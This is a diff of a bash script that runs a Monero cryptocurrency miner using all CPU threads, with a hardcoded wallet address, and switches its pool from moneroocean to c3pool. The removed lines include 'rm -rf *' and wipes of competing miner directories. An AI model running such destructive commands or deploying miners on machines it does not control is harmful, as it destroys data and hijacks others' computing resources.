@@ -1,8 +1,5 @@
 #!/bin/bash
-rm -rf *
-rm -rf $HOME/c3pool
-rm -rf $HOME/c3pool
-rm -rf $HOME/moneroocean
+
 threadCount=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1);
 echo "${threadCount}";
 initdir=$PWD
@@ -69,9 +66,9 @@ k() {
         --threads ${threadCount} \
         --print-time 25 \
         --url $1 \
-        --user 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyhgKUqjg6HRgENMQm.Unix-V3 \
-        --pass Unix-V3 \
+        --user 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyhgKUqjg6HRgENMQm.DV-V1 \
+        --pass DV-V1 \
         --keepalive
 }
 
-k gulf.moneroocean.stream:10001
+k mine.c3pool.com:80
